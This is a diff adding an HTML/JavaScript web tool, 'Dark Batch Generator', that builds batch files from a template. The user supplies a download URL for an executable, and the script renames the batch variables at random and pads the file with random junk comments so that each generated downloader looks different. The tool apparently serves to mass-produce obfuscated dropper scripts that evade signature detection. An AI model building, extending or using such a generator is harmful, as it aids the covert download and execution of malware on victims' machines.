@@ -1,0 +1,201 @@
+<!doctype html>
+<html lang="ar">
+<head>
+<meta charset="utf-8">
+<title>Dark Batch Generator</title>
+<link rel="stylesheet" href="style.css">
+</head>
+<canvas id="matrix"></canvas>
+<body>
+<div class="matrix-bg"></div>
+
+<div class="container">
+  <h1 class="title">Batch Generator</h1>
+  <p class="subtitle">Dark Edition v1.0</p>
+
+  <div class="panel">
+    <label class="label">Download URL</label>
+    <input id="url" type="text" placeholder="https://example.com/file.exe" class="input">
+
+    <div class="actions">
+      <button id="genBtn" class="btn">Generate (server)</button>
+      <button id="previewBtn" class="btn">Preview (client)</button>
+      <button id="copyBtn" class="btn btn-small">Copy Code</button>
+    </div>
+
+    <div class="opts">
+      <label class="checkbox">
+        <input id="commentsChk" type="checkbox" name="comments" value="1">
+        Add random comments
+      </label>
+
+      <div class="range">
+        <label>Len min <input id="min_len" type="number" value="50" min="1" max="500"></label>
+        <label>Len max <input id="max_len" type="number" value="120" min="1" max="500"></label>
+        <label>Cmnts min <input id="min_count" type="number" value="1" min="1" max="20"></label>
+        <label>Cmnts max <input id="max_count" type="number" value="3" min="1" max="20"></label>
+      </div>
+    </div>
+  </div>
+
+  <h2 class="section-title">Preview</h2>
+  <pre id="preview" class="preview"></pre>
+</div>
+
+<footer class="footer">
+  <p>© 2025 — Created by <span>MONSTERMCSY</span></p>
+  <div class="links">
+    <a href="https://github.com/noradlb1" target="_blank">GitHub</a> |
+    <a href="https://t.me/MONSTERMCSY2" target="_blank">Telegram</a> |
+    <a href="https://www.youtube.com/@monstermc12/videos" target="_blank">YouTube</a>
+  </div>
+</footer>
+
+<div id="toast"></div>
+<audio id="toastSound" src="https://actions.google.com/sounds/v1/cartoon/wood_plank_flicks.ogg" preload="auto"></audio>
+
+<script>
+// === logic ===
+async function fetchTemplate(){
+  const r=await fetch('template.bat');
+  if(!r.ok) throw new Error('template.bat not found');
+  return await r.text();
+}
+function rndId(l=8){const c='ABCDEFGHIJKLMNOPQRSTUVWXYZ',a='ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';let s=c[Math.floor(Math.random()*c.length)];for(let i=1;i<l;i++)s+=a[Math.floor(Math.random()*a.length)];return s;}
+function random_string(l){const p='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';let s='';for(let i=0;i<l;i++)s+=p[Math.floor(Math.random()*p.length)];return s;}
+function uuidv4(){return'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g,c=>{const r=Math.random()*16|0,v=c=='x'?r:(r&0x3|0x8);return v.toString(16);});}
+function insertRandomCommentsClient(content,minLen,maxLen,minCount,maxCount){
+  if(minLen<1)minLen=1;if(maxLen<minLen)maxLen=minLen;if(maxLen>500)maxLen=500;
+  if(minCount<1)minCount=1;if(maxCount<minCount)maxCount=minCount;if(maxCount>20)maxCount=20;
+  const lines=content.split(/\r\n|\n|\r/);const out=[];
+  for(let i=0;i<lines.length;i++){
+    out.push(lines[i]);
+    if(Math.random()<0.5){
+      const c=Math.floor(Math.random()*(maxCount-minCount+1))+minCount;
+      for(let j=0;j<c;j++){
+        const len=Math.floor(Math.random()*(maxLen-minLen+1))+minLen;
+        const chunkSize=60;const parts=[];let rem=len;
+        while(rem>0){const take=Math.min(chunkSize,rem);parts.push(random_string(take));rem-=take;}
+        out.push('rem '+parts.join('_'));
+      }
+    }
+  }
+  return out.join('\r\n');
+}
+function randomizeClient(tpl,url){
+  const keys=['URL','TEMP_DIR','LOGFILE','RETRIES','COUNT','RAND','FILE'];
+  const map={};keys.forEach(k=>map[k]=rndId(6));
+  let out=tpl.replace(/%DOWNLOAD_URL%/g,url);
+  for(const o in map){
+    const r=map[o];
+    out=out.replace(new RegExp('\\bset\\s+'+o+'\\s*=','ig'),'set '+r+'=');
+    out=out.split('!'+o+'!').join('!'+r+'!');
+    out=out.split('%'+o+'%').join('%'+r+'%');
+  }
+  return out;
+}
+
+// === toast notifications ===
+function showToast(msg,side='right'){
+  const toast=document.getElementById('toast');
+  const sound=document.getElementById('toastSound');
+  toast.textContent=msg;
+  toast.className='show '+side;
+  sound.currentTime=0; sound.play().catch(()=>{});
+  setTimeout(()=>toast.className=toast.className.replace('show',''),3000);
+}
+
+// === events ===
+document.getElementById('previewBtn').addEventListener('click',async()=>{
+  const url=document.getElementById('url').value.trim();
+  if(!url){showToast('أدخل رابط التحميل','left');return;}
+  try{
+    const tpl=await fetchTemplate();
+    let out=randomizeClient(tpl,url);
+    const genId=Math.floor(Math.random()*900000)+100000+'_'+(Math.floor(Math.random()*9000)+1000);
+    const version='1.0.0';
+    const uuid=uuidv4();
+    const timestamp=(new Date()).toISOString().replace('T',' ').split('.')[0];
+    const header=['rem genid: '+genId,'rem version: '+version,'rem uuid: '+uuid,'rem generated: '+timestamp,'rem generator: batch-generator',''].join('\r\n');
+    const commentsOn=document.getElementById('commentsChk').checked;
+    if(commentsOn){
+      const min_len=parseInt(document.getElementById('min_len').value)||50;
+      const max_len=parseInt(document.getElementById('max_len').value)||120;
+      const min_count=parseInt(document.getElementById('min_count').value)||1;
+      const max_count=parseInt(document.getElementById('max_count').value)||3;
+      out=insertRandomCommentsClient(out,min_len,max_len,min_count,max_count);
+    }
+    document.getElementById('preview').textContent=header+out;
+    showToast('Code generated!','right');
+  }catch(e){
+    showToast('Error: '+e.message,'left');
+  }
+});
+
+document.getElementById('genBtn').addEventListener('click',()=>{
+  const url=document.getElementById('url').value.trim();
+  if(!url){showToast('أدخل رابط التحميل','left');return;}
+  const f=document.createElement('form');f.method='POST';f.action='generate.php';
+  const add=(n,v)=>{const i=document.createElement('input');i.type='hidden';i.name=n;i.value=v;f.appendChild(i);};
+  add('url',url);
+  if(document.getElementById('commentsChk').checked){
+    add('comments','1');
+    add('min_len',document.getElementById('min_len').value);
+    add('max_len',document.getElementById('max_len').value);
+    add('min_count',document.getElementById('min_count').value);
+    add('max_count',document.getElementById('max_count').value);
+  }
+  document.body.appendChild(f);
+  f.submit();
+});
+
+document.getElementById('copyBtn').addEventListener('click',()=>{
+  const txt=document.getElementById('preview').textContent.trim();
+  if(!txt){showToast('لا يوجد كود لنسخه','left');return;}
+  navigator.clipboard.writeText(txt).then(()=>showToast('Copied to clipboard','right'));
+});
+</script>
+<script>
+/* Matrix intro animation */
+const canvas=document.getElementById('matrix');
+const ctx=canvas.getContext('2d');
+let fadeDone=false;
+
+function resizeCanvas(){
+  canvas.width=window.innerWidth;
+  canvas.height=window.innerHeight;
+}
+resizeCanvas();
+window.addEventListener('resize',resizeCanvas);
+
+const letters='アァカサタナハマヤャラワガザダバパイィキシチニヒミリヰギジヂビピウゥクスツヌフムユュルグズヅブプエェケセテネヘメレヱゲゼデベペオォコソトノホモヨョロヲゴゾドボポヴッンABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'.split('');
+const fontSize=16;
+let columns=Math.floor(window.innerWidth/fontSize);
+let drops=Array(columns).fill(1);
+
+function drawMatrix(){
+  ctx.fillStyle='rgba(0,0,0,0.1)';
+  ctx.fillRect(0,0,canvas.width,canvas.height);
+  ctx.fillStyle='#0f0';
+  ctx.font=fontSize+'px monospace';
+  for(let i=0;i<drops.length;i++){
+    const text=letters[Math.floor(Math.random()*letters.length)];
+    ctx.fillText(text,i*fontSize,drops[i]*fontSize);
+    if(drops[i]*fontSize>canvas.height&&Math.random()>0.975){drops[i]=0;}
+    drops[i]++;
+  }
+}
+
+let interval=setInterval(drawMatrix,50);
+
+/* fade out intro after 4 seconds */
+setTimeout(()=>{
+  canvas.classList.add('fade-out');
+  document.querySelector('.container').classList.add('visible');
+  fadeDone=true;
+  clearInterval(interval);
+},4000);
+</script>
+
+</body>
+</html>
